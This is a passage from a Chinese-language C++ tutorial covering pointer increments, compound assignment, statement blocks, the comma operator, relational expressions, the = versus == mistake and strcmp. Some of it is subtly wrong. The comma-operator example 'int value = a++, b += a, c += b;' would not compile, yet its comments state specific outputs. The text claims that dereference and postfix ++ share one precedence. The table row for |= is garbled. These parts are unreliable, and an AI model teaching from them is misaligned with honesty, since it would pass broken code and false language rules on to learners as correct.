arr; <span class="comment">// 重置</span></span><br><span class="line">    ++*ptr; <span class="comment">// 将 arr[0] 的值从 1.1 增加到 2.1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After ++*ptr : arr[0] = &quot;</span> &lt;&lt; arr[<span class="number">0</span>] &lt;&lt; <span class="string">&quot;, ptr points to value &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// arr[0]=2.1, ptr 指向 2.1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// (*ptr)++ : 获取 ptr 指向的值，然后将该值加 1 (括号强制先解引用)</span></span><br><span class="line">    ptr = arr; <span class="comment">// 重置</span></span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">1.1</span>; <span class="comment">// 恢复 arr[0]</span></span><br><span class="line">    (*ptr)++; <span class="comment">// 将 arr[0] 的值从 1.1 增加到 2.1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After (*ptr)++: arr[0] = &quot;</span> &lt;&lt; arr[<span class="number">0</span>] &lt;&lt; <span class="string">&quot;, ptr points to value &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// arr[0]=2.1, ptr 指向 2.1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优先级:</strong> 解引用 <code>*</code> 和前/后缀 <code>++</code>/<code>--</code> 的优先级相同，结合性是从右到左。为了清晰起见，当结合使用时，使用括号 <code>()</code> 是个好主意，例如 <code>(*ptr)++</code>。</p><h3 id="5-1-9-组合赋值运算符"><a href="#5-1-9-组合赋值运算符" class="headerlink" title="5.1.9 组合赋值运算符"></a>5.1.9 组合赋值运算符</h3><p>C++ 提供了一组组合赋值运算符，将算术运算和赋值运算合并为一个运算符，使代码更简洁。</p><table><thead><tr><th align="left">运算符</th><th align="left">示例</th><th align="left">等价于</th></tr></thead><tbody><tr><td align="left"><code>+=</code></td><td align="left"><code>x += y</code></td><td align="left"><code>x = x + y</code></td></tr><tr><td align="left"><code>-=</code></td><td align="left"><code>x -= y</code></td><td align="left"><code>x = x - y</code></td></tr><tr><td align="left"><code>*=</code></td><td align="left"><code>x *= y</code></td><td align="left"><code>x = x * y</code></td></tr><tr><td align="left"><code>/=</code></td><td align="left"><code>x /= y</code></td><td align="left"><code>x = x / y</code></td></tr><tr><td align="left"><code>%=</code></td><td align="left"><code>x %= y</code></td><td align="left"><code>x = x % y</code></td></tr><tr><td align="left"><code>&amp;=</code></td><td align="left"><code>x &amp;= y</code></td><td align="left"><code>x = x &amp; y</code></td></tr><tr><td align="left">`</td><td align="left">=`</td><td align="left">`x</td></tr><tr><td align="left"><code>^=</code></td><td align="left"><code>x ^= y</code></td><td align="left"><code>x = x ^ y</code></td></tr><tr><td align="left"><code>&lt;&lt;=</code></td><td align="left"><code>x &lt;&lt;= y</code></td><td align="left"><code>x = x &lt;&lt; y</code></td></tr><tr><td align="left"><code>&gt;&gt;=</code></td><td align="left"><code>x &gt;&gt;= y</code></td><td align="left"><code>x = x &gt;&gt; y</code></td></tr></tbody></table><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> bonus = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> penalty = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> factor = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    score += bonus; <span class="comment">// score = score + bonus; score 变为 110</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after bonus: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    score -= penalty; <span class="comment">// score = score - penalty; score 变为 105</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after penalty: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    score *= factor; <span class="comment">// score = score * factor; score 变为 210</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after factor: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    score /= <span class="number">3</span>; <span class="comment">// score = score / 3; score 变为 70 (整数除法)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after division: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    score %= <span class="number">8</span>; <span class="comment">// score = score % 8; score 变为 6 (70 除以 8 余 6)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after modulo: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 for 循环更新中使用</span></span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; ++i) &#123;</span><br><span class="line">        total += i; <span class="comment">// 累加</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total (1-5): &quot;</span> &lt;&lt; total &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 15</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>组合赋值运算符通常更易读，并且可能比分开写稍微高效一些。</p><h3 id="5-1-10-复合语句（语句块）"><a href="#5-1-10-复合语句（语句块）" class="headerlink" title="5.1.10 复合语句（语句块）"></a>5.1.10 复合语句（语句块）</h3><p><strong>复合语句 (Compound Statement)</strong> 或 <strong>语句块 (Block)</strong> 是由一对花括号 <code>&#123;&#125;</code> 括起来的零条或多条语句。</p><p><strong>作用:</strong></p><ul><li>  <strong>语法需要:</strong> 在 C++ 语法要求只能出现<strong>一条</strong>语句的地方（例如 <code>if</code>, <code>else</code>, <code>for</code>, <code>while</code> 的循环体），可以使用语句块来包含<strong>多条</strong>语句。</li><li>  <strong>创建作用域:</strong> 语句块会创建一个新的**局部作用域 (Local Scope)**。在块内声明的变量（自动存储变量）只在该块内部可见，并在块结束时销毁。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">5</span>) &#123; <span class="comment">// if 后面需要一条语句，这里使用语句块</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;x is greater than 5.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">int</span> y = x * <span class="number">2</span>; <span class="comment">// y 只在 if 块内部可见</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Double x is: &quot;</span> &lt;&lt; y &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="comment">// y 在这里销毁</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; y; // 错误! y 在此作用域不可见</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loop with block:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i) &#123; <span class="comment">// for 循环体使用语句块</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Outer loop i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">int</span> j = i + <span class="number">10</span>; <span class="comment">// j 只在 for 循环的当前迭代块内可见</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Inner variable j = &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="comment">// 每次迭代结束时 j 销毁</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-11-其他语法技巧——逗号运算符"><a href="#5-1-11-其他语法技巧——逗号运算符" class="headerlink" title="5.1.11 其他语法技巧——逗号运算符"></a>5.1.11 其他语法技巧——逗号运算符</h3><p><strong>逗号运算符 (<code>,</code>)</strong> 是 C++ 中优先级最低的运算符。它允许将两个表达式连接成一个表达式。</p><p><strong>行为:</strong></p><ol><li> 先计算逗号左侧的表达式。</li><li> <strong>丢弃</strong>左侧表达式的计算结果。</li><li> 然后计算逗号右侧的表达式。</li><li> 整个逗号表达式的结果是<strong>右侧表达式</strong>的值和类型。</li></ol><p><strong>主要用途:</strong></p><ul><li>  <strong><code>for</code> 循环的初始化和更新部分:</strong> 允许在这些部分执行多个操作，而不需要语句块。</li><li>  (较少见) 在需要单个表达式的地方执行多个有副作用的操作。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 在 for 循环中使用逗号运算符</span></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using comma in for loop:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">10</span>; <span class="comment">// 初始化: 初始化 i 和 j</span></span><br><span class="line">         i &lt; j;         <span class="comment">// 条件</span></span><br><span class="line">         ++i, --j)      <span class="comment">// 更新: 递增 i, 递减 j</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j = &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 逗号表达式的值</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> result = (x = <span class="number">5</span>, x + <span class="number">10</span>); <span class="comment">// x 先被赋值为 5, 然后计算 x+10 (15)</span></span><br><span class="line">                                  <span class="comment">// 整个表达式的结果是 15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result of comma expression: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;x after comma expression: &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 输出 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 优先级最低</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>, c = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> value = a++, b += a, c += b; <span class="comment">// 逗号优先级低于赋值</span></span><br><span class="line">    <span class="comment">// 这实际上等价于: value = a++; (value=1, a=2) 然后计算 b+=a (b=2+2=4), 然后计算 c+=b (c=3+4=7)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;value=&quot;</span> &lt;&lt; value &lt;&lt; <span class="string">&quot;, a=&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b=&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;, c=&quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 value=1, a=2, b=4, c=7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果想按顺序执行并取最后结果，需要括号</span></span><br><span class="line">    value = (++a, b += a, c += b); <span class="comment">// a=3, b=4+3=7, c=7+7=14. value=14</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;value=&quot;</span> &lt;&lt; value &lt;&lt; <span class="string">&quot;, a=&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b=&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;, c=&quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 value=14, a=3, b=7, c=14</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然逗号运算符提供了这种能力，但过度使用可能降低代码的可读性。在 <code>for</code> 循环的初始化和更新部分是其最常见且合理的用途。</p><h3 id="5-1-12-关系表达式"><a href="#5-1-12-关系表达式" class="headerlink" title="5.1.12 关系表达式"></a>5.1.12 关系表达式</h3><p><strong>关系表达式 (Relational Expression)</strong> 使用关系运算符来比较两个操作数的值，其结果是一个布尔值 (<code>true</code> 或 <code>false</code>)。</p><p><strong>关系运算符:</strong></p><ul><li>  <code>&lt;</code> : 小于 (Less than)</li><li>  <code>&gt;</code> : 大于 (Greater than)</li><li>  <code>&lt;=</code>: 小于或等于 (Less than or equal to)</li><li>  <code>&gt;=</code>: 大于或等于 (Greater than or equal to)</li><li>  <code>==</code>: 等于 (Equal to)</li><li>  <code>!=</code>: 不等于 (Not equal to)</li></ul><p>这些运算符的优先级低于算术运算符，但高于赋值运算符。<code>==</code> 和 <code>!=</code> 的优先级低于其他四个关系运算符。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score = <span class="number">85</span>;</span><br><span class="line">    <span class="keyword">int</span> passing_score = <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">double</span> temp1 = <span class="number">36.5</span>, temp2 = <span class="number">37.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isPassing = (score &gt;= passing_score); <span class="comment">// 比较 score 是否大于等于 passing_score</span></span><br><span class="line">    <span class="keyword">bool</span> isFever = (temp1 &gt; temp2);          <span class="comment">// 比较 temp1 是否大于 temp2</span></span><br><span class="line">    <span class="keyword">bool</span> isEqual = (score == <span class="number">85</span>);            <span class="comment">// 比较 score 是否等于 85</span></span><br><span class="line">    <span class="keyword">bool</span> isNotEqual = (temp1 != temp2);      <span class="comment">// 比较 temp1 是否不等于 temp2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::boolalpha; <span class="comment">// 使 bool 输出为 true/false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score: &quot;</span> &lt;&lt; score &lt;&lt; <span class="string">&quot;, Passing Score: &quot;</span> &lt;&lt; passing_score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Is passing? &quot;</span> &lt;&lt; isPassing &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 输出 true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Is fever? &quot;</span> &lt;&lt; isFever &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 输出 false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Is score 85? &quot;</span> &lt;&lt; isEqual &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;    <span class="comment">// 输出 true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Temps not equal? &quot;</span> &lt;&lt; isNotEqual &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 true</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在循环条件中使用</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (count &lt; <span class="number">3</span>) &#123; <span class="comment">// 当 count 小于 3 时循环</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count is &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-13-赋值、比较和可能犯的错误"><a href="#5-1-13-赋值、比较和可能犯的错误" class="headerlink" title="5.1.13 赋值、比较和可能犯的错误"></a>5.1.13 赋值、比较和可能犯的错误</h3><p>一个非常常见的 C++ 编程错误是将<strong>赋值运算符 (<code>=</code>)</strong> 误用在需要<strong>比较运算符 (<code>==</code>)</strong> 的地方，尤其是在 <code>if</code> 或 <code>while</code> 的条件语句中。</p><ul><li><p><code>if (x = 5)</code>: 这不是比较 <code>x</code> 是否等于 5。它的作用是：</p><ol><li> 将 5 赋给变量 <code>x</code>。</li><li> 整个赋值表达式 <code>(x = 5)</code> 的结果是赋给 <code>x</code> 的值，即 5。</li><li>在 <code>if</code> 条件中，非零值被视为 <code>true</code>。<br>因此，这个 <code>if</code> 语句<strong>总是</strong>会执行其代码块（除非 5 被视为 false，这在 C++ 中不会发生），并且还会意外地将 <code>x</code> 的值修改为 5。</li></ol></li><li><p>  <code>if (x == 5)</code>: 这才是正确的比较，检查 <code>x</code> 的当前值是否等于 5，结果为 <code>true</code> 或 <code>false</code>，并且<strong>不会</strong>修改 <code>x</code> 的值。</p></li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your score: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误: 使用了赋值 =</span></span><br><span class="line">    <span class="keyword">if</span> (score = <span class="number">100</span>) &#123; <span class="comment">// 总是 true，并且 score 被改为 100</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mistake: You entered 100 (or maybe not, score is now 100).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mistake: This part will likely never execute.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after mistaken if: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// score 总是 100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正确: 使用了比较 ==</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter your score again: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line">    <span class="keyword">if</span> (score == <span class="number">100</span>) &#123; <span class="comment">// 正确比较</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: Perfect score!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: Score is not 100.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after correct if: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// score 保持用户输入的值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如何避免:</strong></p><ul><li>  仔细检查条件语句中的 <code>=</code> 和 <code>==</code>。</li><li>  一些编码风格建议将常量放在比较运算符的左边（”Yoda conditions”），例如 <code>if (100 == score)</code>。这样如果意外写成 <code>if (100 = score)</code>，编译器会报错，因为不能给常量赋值。</li></ul><h3 id="5-1-14-C风格字符串的比较"><a href="#5-1-14-C风格字符串的比较" class="headerlink" title="5.1.14 C风格字符串的比较"></a>5.1.14 C风格字符串的比较</h3><p>对于 C 风格字符串（<code>char</code> 数组或 <code>char*</code> 指针），<strong>不能</strong>直接使用关系运算符（<code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code> 等）来比较字符串的<strong>内容</strong>。</p><p>当对两个 <code>char*</code> 指针使用 <code>==</code> 或 <code>!=</code> 时，比较的是指针存储的<strong>内存地址</strong>，而不是它们指向的字符串内容。</p><p>要比较 C 风格字符串的内容，需要使用 C 字符串库 <code>&lt;cstring&gt;</code> (或 C 的 <code>&lt;string.h&gt;</code>) 中提供的函数，主要是 <code>strcmp()</code>。</p><ul><li><code>strcmp(str1, str2)</code>:<ul><li>  如果 <code>str1</code> 按字典序等于 <code>str2</code>，返回 0。</li><li>  如果 <code>str1</code> 小于 <code>str2</code>，返回负值。</li><li>  如果 <code>str1</code> 大于 <code>str2</code>，返回正值。</li></ul></li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // 为了 strcmp()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> word1[] = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> word2[] = <span class="string">&quot;apply&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> word3[] = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p1 = <span class="string">&quot;banana&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p2 = <span class="string">&quot;banana&quot;</span>; <span class="comment">// 编译器可能将相同的字面值存储在同一地址</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p3 